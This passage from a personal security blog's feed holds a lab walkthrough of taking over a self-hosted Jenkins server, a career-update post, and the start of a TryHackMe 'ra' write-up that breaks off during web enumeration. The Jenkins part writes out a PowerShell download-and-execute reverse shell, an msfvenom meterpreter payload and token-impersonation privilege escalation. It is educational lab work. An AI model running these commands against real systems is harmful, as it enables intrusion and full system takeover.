+<p><img src="/CICD-DevOps.png" alt="cicd"></p>
+<h2 id="jenkins">jenkins</h2>
+<p>jenkins is an open-source CI/CD automation software, written in java. it&rsquo;s used to implement CI/CD workflows, called pipelines.</p>
+<p>pipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers).</p>
+<p>for this experiment, i&rsquo;ve spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM.</p>
+<p>once everything is set up, let&rsquo;s start with a simple nmap scan of the target machine.</p>
+<pre tabindex="0"><code>nmap -sT -Pn -v 10.10.77.68
+</code></pre><p><img src="/jenkins-nmap.png" alt="nmap"></p>
+<p>the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i&rsquo;ll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you&rsquo;ll see a &ldquo;project&rdquo; that was created just for this experiment.</p>
+<p><img src="/jenkins-dashboard.png" alt="dashboard"></p>
+<p>since this is a windows application, i&rsquo;ll use the <a href="https://github.com/samratashok/nishang">nishang</a> repo for a script, more specifically <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">this</a> reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you&rsquo;d like.</p>
+<p>in kali, i created a directory to download the script to.</p>
+<pre tabindex="0"><code>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+</code></pre><p>now let&rsquo;s create a simple web server so that this script can be downloaded into jenkins.</p>
+<pre tabindex="0"><code>python -m SimpleHTTPServer 80
+</code></pre><p>back in jenkins, if you click &ldquo;project&rdquo; &gt; configure &gt; build, you&rsquo;ll see a command box that lets you execute any command.</p>
+<p><img src="/jenkins-build.png" alt="build"></p>
+<p>first, start a netcat listener in kali.</p>
+<pre tabindex="0"><code>nc -lvnp 9001
+</code></pre><p>in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.</p>
+<pre tabindex="0"><code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.9.4.75:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.75 -Port 9001
+</code></pre><p>save the build, then click &ldquo;build now&rdquo; from the project page. the netcat listener will receive a connection to the target.</p>
+<p><img src="/jenkins-netcat.png" alt="netcat"></p>
+<p>to make privesc easier, it&rsquo;s better to switch to a meterpreter shell.</p>
+<p>first, create an msfvenom payload in the same directory we saved the powershell script to.</p>
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe
+</code></pre><p>download it to the machine similar to how we did it before, via the HTTP server and the build command box.</p>
+<pre tabindex="0"><code>powershell &#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.9.4.75:8000/jenkins.exe&#39;,&#39;jenkins.exe&#39;)&#34;
+</code></pre><p>save this build, but before building, let&rsquo;s create a handler in metasploit to receive the connection.</p>
+<pre tabindex="0"><code>&gt; use exploit/multi/handler
+&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+&gt; set LHOST 10.9.4.75
+&gt; set LPORT 9002
+&gt; run
+</code></pre><p>back in jenkins, once you build and the payload has been downloaded to target, in the msfconsole shell type the following to get the meterpreter shell.</p>
+<pre tabindex="0"><code>&gt; Start-Process &#34;jenkins.exe&#34;
+</code></pre><h2 id="token-impersonation-to-gain-system-access">token impersonation to gain system access</h2>
+<p>windows uses tokens to ensure accounts have the right privileges to carry out certain actions. tokens are assigned to an account when users log in or when they&rsquo;re authenticated. this is usually done by <code>LSASS.exe</code>, generates the process responsible for authenticating users for the WINLOGON service. this is performed by using authentication packages like <code>msgina.dll</code>.</p>
+<p>once authentication is successful, LSASS generates the user&rsquo;s access token, which is used to launch the initial shell. other processes the user initiates then inherit this token.</p>
+<p>the user&rsquo;s access token consists of: user SIDs, group SIDs, privileges. you can read more about access tokens <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">here</a>.</p>
+<p>there are 2 types of access tokens:</p>
+<ol>
+<li>primary access tokens: associated with a user account, generated on log on</li>
+<li>impersonation tokens: allow a particular process to use the token of another</li>
+</ol>
+<p>the different levels of impersonation tokens:</p>
+<ul>
+<li><strong>SecurityAnonymous</strong>: current user/client cannot impersonate another user/client</li>
+<li><strong>SecurityIdentification</strong>: current user/client can get the identity and privileges of a client, but cannot impersonate the client</li>
+<li><strong>SecurityImpersonation</strong>: current user/client can impersonate the client&rsquo;s security context on the local system</li>
+<li><strong>SecurityDelegation</strong>: current user/client can impersonate the client&rsquo;s security context on a remote system</li>
+</ul>
+<p>security context refers to the data structure that contain users&rsquo; relevant security information.</p>
+<p>privileges of an account allow the user to carry out particular actions.
+the most commonly abused privileges are:</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilege</li>
+<li>SeBackupPrivilege</li>
+<li>SeRestorePrivilege</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege</li>
+</ul>
+<p>you can read more about them <a href="https://www.exploit-db.com/papers/42556">here</a>.</p>
+<p>back in the meterpreter shell, we can check privs easily.</p>
+<pre tabindex="0"><code>&gt; whoami /priv
+</code></pre><p>2 privileges should show up: SeDebugPrivilege and SeImpersonatePrivilege. let&rsquo;s use incognito mode to exploit this.</p>
+<pre tabindex="0"><code>&gt; load incognito
+</code></pre><p>to check which tokens are available to us:</p>
+<pre tabindex="0"><code>&gt; list_tokens -g
+</code></pre><p>the token <strong>BUILTIN\Administrators</strong> is available. impersonating it should be easy.</p>
+<pre tabindex="0"><code>&gt; impersonate_token &#34;BUILTIN\Administrators&#34;
+</code></pre><p>it&rsquo;s good practice to double check privileges.</p>
+<pre tabindex="0"><code>&gt; getuid
+</code></pre><p>although we now have a higher privilege token, we may not actually have higher privilege permissions. windows uses a primary token of the process and not the impersonated token to determine what the process can do. so, we just migrate to a process with correct permissions. the safest process to pick is usually <code>services.exe</code>.</p>
+<pre tabindex="0"><code>&gt; ps
+&gt; migrate &lt;PID&gt;
+</code></pre><p>we&rsquo;ve now migrated to an elevated process using its process ID (PID).</p>
+<p>so, there it is. we exploited jenkins to further exploit security misconfigurations to get root access on the target system. pretty cool!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>update</title>
+            <link>/posts/2022/01/update/</link>
+            <pubDate>Sat, 08 Jan 2022 13:59:22 -0500</pubDate>
+            
+            <guid>/posts/2022/01/update/</guid>
+            <description>hello!
+it&amp;rsquo;s been a while since my last post, but there&amp;rsquo;s a reason (i promise).
+as you may know, this past year i&amp;rsquo;ve been seriously pursuing security as both a passion and possible career. it&amp;rsquo;s been a fun time learning and a not-so-fun time applying for jobs (i believe i might have applied to 300+ jobs &amp;ndash; seriously). the great news is that i&amp;rsquo;ve finally got a job as a security researcher for trustwave&amp;rsquo;s spiderlabs.</description>
+            <content type="html"><![CDATA[<p>hello!</p>
+<p>it&rsquo;s been a while since my last post, but there&rsquo;s a reason (i promise).</p>
+<p>as you may know, this past year i&rsquo;ve been seriously pursuing security as both a passion and possible career. it&rsquo;s been a fun time learning and a not-so-fun time applying for jobs (i believe i might have applied to 300+ jobs &ndash; seriously). the great news is that i&rsquo;ve finally got a job as a security researcher for trustwave&rsquo;s <a href="https://www.trustwave.com/en-us/company/about-us/spiderlabs/">spiderlabs</a>.</p>
+<p>i am beyond excited for this new opportunity, as well as a little nervous (but mostly excited). i&rsquo;ve been recruited for the database security (DST) team, specifically because of my experience as a database developer, my extensive work with MS SQL Server, and my laziness that resulted in automating large chunks of my (old) job. through my education in the past year, i&rsquo;ve also been exposed to postgreSQL, MySQL, MariaDB, and more. it might have also helped that most of my team are also electrical engineering grads that are now almost completely detached from the field.</p>
+<p>that said, i don&rsquo;t think the future posts on this site will be rigidly database related. since we at spiderlabs get a &ldquo;hackday&rdquo; (a day devoted to researching any topic we like), i might be focused on writing posts related to whatever i&rsquo;m working on at that moment. i&rsquo;m also still studying for my eCPPT exam, though it had taken a backseat due to personal factors, so i will attempt to write more deeply about the topics in that course.</p>
+<p>i&rsquo;d just like to take this moment to thank whoever has been reading my ramblings, and i hope you&rsquo;ve learned something from them. here&rsquo;s to a more fulfilling year ahead!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>tryhackme: ra</title>
+            <link>/posts/2021/11/tryhackme-ra/</link>
+            <pubDate>Wed, 10 Nov 2021 16:37:38 -0500</pubDate>
+            
+            <guid>/posts/2021/11/tryhackme-ra/</guid>
+            <description>as i&amp;rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&amp;rsquo;ve had to take time away from it to keep practicing all that i&amp;rsquo;ve learned so far. &amp;ldquo;ra&amp;rdquo; happened to be the most challenging room i&amp;rsquo;ve done until now, but i&amp;rsquo;m sure there are more to come, that take even more skills into account.</description>
+            <content type="html"><![CDATA[<p>as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account.</p>
+<p>the story with the room is that there&rsquo;s a mega corporation called WindCorp, and they like to brag about the fact that they&rsquo;re &ldquo;unhackable&rdquo;. in this story, we&rsquo;re a hacker trying to make them eat their words, and we&rsquo;ll be exploiting a windows machine that we&rsquo;ve spotted.</p>
+<p>as usual, we get a target IP address: 10.10.75.59</p>
+<p>and again, we&rsquo;ll start off with an nmap scan (and save the results):</p>
+<pre tabindex="0"><code>nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
+# Nmap 7.91 scan initiated Wed Oct 27 14:05:11 2021 as: nmap -sC -sV -Pn -oN openports.txt 10.10.75.59
+Nmap scan report for windcorp.thm (10.10.75.59)
+Host is up (0.15s latency).
+Not shown: 978 filtered ports
+PORT     STATE SERVICE             VERSION
+53/tcp   open  domain              Simple DNS Plus
+80/tcp   open  http                Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Windcorp.
+88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
+135/tcp  open  msrpc               Microsoft Windows RPC
+139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+| http-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|_  Product_Version: 10.0.17763
+|_http-title: Site doesn&#39;t have a title.
+| ssl-cert: Subject: commonName=Windows Admin Center
+| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
+| Not valid before: 2020-04-30T14:41:03
+|_Not valid after:  2020-06-30T14:41:02
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+2179/tcp open  vmrdp?
+3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-10-27T18:06:51+00:00
+| ssl-cert: Subject: commonName=Fire.windcorp.thm
+| Not valid before: 2021-10-26T17:59:00
+|_Not valid after:  2022-04-27T17:59:00
+5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     stream_id: 6w7aj2dxwk
+|     unknown: 
+| 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|     compression_methods: 
+| 
+|     xmpp: 
+|       version: 1.0
+|_    features: 
+5269/tcp open  xmpp                Wildfire XMPP Client
+| xmpp-info: 
+|   Respects server name
+|   STARTTLS Failed
+|   info: 
+|     stream_id: 79ay7u58wh
+|     unknown: 
+| 
+|     errors: 
+|       host-unknown
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|     compression_methods: 
+| 
+|     xmpp: 
+|       version: 1.0
+|_    features: 
+7070/tcp open  http                Jetty 9.4.18.v20190429
+|_http-title: Openfire HTTP Binding Service
+7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+|_http-title: Openfire HTTP Binding Service
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+7777/tcp open  socks5              (No authentication; connection failed)
+| socks-auth-info: 
+|_  No authentication
+9090/tcp open  zeus-admin?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:06 GMT
+|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 115
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
+|     &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=index.jsp&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:14 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   JavaRMI, drda, ibm-db2-das, informix: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   SqueezeCenter_CLI: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   WMSRequest: 
+|     HTTP/1.1 400 Illegal character CNTL=0x1
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;
+9091/tcp open  ssl/xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:32 GMT
+|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 115
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
+|     &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=index.jsp&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:33 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 400 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9090-TCP:V=7.91%I=7%D=10/27%Time=6179950F%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,11D,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20
+SF:2021\x2018:06:06\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
+SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
+SF:ytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/title&gt;\n&lt;m
+SF:eta\x20http-equiv=\&#34;refresh\&#34;\x20content=\&#34;0;URL=index\.jsp\&#34;&gt;\n&lt;/head&gt;
+SF:\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&#34;)%r(JavaRMI,C3,&#34;HTTP/1\.1\x20400\x20Ille
+SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
+SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\
+SF:x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;
+SF:/pre&gt;&#34;)%r(WMSRequest,C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
+SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
+SF:th:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;
+SF:&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x1&lt;/pre&gt;&#34;)%r(ibm-db2-das,
+SF:C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
+SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
+SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illeg
+SF:al\x20character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(SqueezeCenter_CLI,9B,&#34;HTTP/1\.1\x
+SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
+SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message
+SF:\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/pre&gt;&#34;)%r(informix,C3,&#34;HTTP/1\.1\
+SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
+SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
+SF:\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20characte
+SF:r\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(drda,C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20charact
+SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
+SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20
+SF:400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(HTTP
+SF:Options,56,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20202
+SF:1\x2018:06:14\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9091-TCP:V=7.91%T=SSL%I=7%D=10/27%Time=61799529%P=x86_64-pc-linux-g
+SF:nu%r(GetRequest,11D,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20O
+SF:ct\x202021\x2018:06:32\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
+SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
+SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/titl
+SF:e&gt;\n&lt;meta\x20http-equiv=\&#34;refresh\&#34;\x20content=\&#34;0;URL=index\.jsp\&#34;&gt;\n&lt;
+SF:/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&#34;)%r(HTTPOptions,56,&#34;HTTP/1\.1\x202
+SF:00\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x202021\x2018:06:33\x20GMT\r\nAl
+SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&#34;)%r(RTSPRequest,AD,&#34;HTTP/1\.1\x20
+SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
+SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20
+SF:Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;&#34;)%r(RPCChec
+SF:k,C7,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
+SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
+SF:ection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20I
+SF:llegal\x20character\x20OTEXT=0x80&lt;/pre&gt;&#34;)%r(DNSVersionBindReqTCP,C3,&#34;HT
+SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
+SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
+SF:0close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20
+SF:character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(DNSStatusRequestTCP,C3,&#34;HTTP/1\.1\x2040
+SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
+SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
+SF:n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20
+SF:CNTL=0x0&lt;/pre&gt;&#34;)%r(Help,9B,&#34;HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
+SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
+SF:ion:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x
+SF:20URI&lt;/pre&gt;&#34;)%r(SSLSessionReq,C5,&#34;HTTP/1\.1\x20400\x20Illegal\x20charac
+SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
+SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x
+SF:20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;&#34;);
+Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-10-27T18:06:52
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Oct 27 14:09:16 2021 -- 1 IP address (1 host up) scanned in 245.53 seconds
+</code></pre><p>well. that&rsquo;s big.</p>
+<p>i&rsquo;ll trim the fat:</p>
+<pre tabindex="0"><code>53/tcp   open  domain              Simple DNS Plus
+80/tcp   open  http                Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
+135/tcp  open  msrpc               Microsoft Windows RPC
+139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+2179/tcp open  vmrdp?
+3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+5269/tcp open  xmpp                Wildfire XMPP Client
+7070/tcp open  http                Jetty 9.4.18.v20190429
+7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+7777/tcp open  socks5              (No authentication; connection failed)
+9090/tcp open  zeus-admin?
+9091/tcp open  ssl/xmltec-xmlmail?
+</code></pre><p>we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.</p>
+<p>i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name).</p>
+<p>let&rsquo;s visit <a href="http://windcorp.thm">http://windcorp.thm</a>.</p>
+<p>the search bar on the site doesn&rsquo;t work, but the &ldquo;reset password&rdquo; link does.</p>
+<p><img src="/resetpassword.png" alt="reset"></p>
+<p>i have no idea how to fill in these fields, so i&rsquo;m going to continue digging around the site.</p>
+<p>scrolling down a bit, and we can see a list of employees:</p>
+<pre tabindex="0"><code>Antonietta Vidal
+Britney Palmer
+Brittany Cruz
+Carla Meyer
+Buse Candan
+Edeltraut Daub
+Edward Lewis
+Emile Lavoie
+Emile Henry
+Emily Anderson
+Hemmo Boschma
+Isabella Hughes
+Isra Saur
+Jackson Vasquez
+Jaqueline Dittmer
+Emily Jensen
+Lily Levesque
+Kirk Uglas
+</code></pre><p>let&rsquo;s save these names to a file (users.txt), then break up the names so we can search the site&rsquo;s source to see if they pop in any form anywhere else.</p>
+<pre tabindex="0"><code>cat users.txt | tr -s &#39; &#39; &#39;\n&#39; &gt; userslist.txt
+</code></pre><p>the output (userslist.txt) now looks like:</p>
+<pre tabindex="0"><code>Antonietta
+Vidal
+Britney
+Palmer
+Brittany
+Cruz
+Carla
+Meyer
+Buse
+Candan
+Edeltraut
+Daub
+Edward
+Lewis
+Emile
+Lavoie
+Emile
+Henry
+Emily
+Anderson
+Hemmo
+Boschma
+Isabella
+Hughes
+Isra
+Saur
+Jackson
+Vasquez
+Jaqueline
+Dittmer
+Emily
+Jensen
+Lily
+Levesque
+Kirk
+Uglas
+</code></pre><p>now let&rsquo;s feed this list to a <code>curl</code> command:</p>
+<pre tabindex="0"><code>curl http://windcorp.thm | egrep -i -f userslist.txt
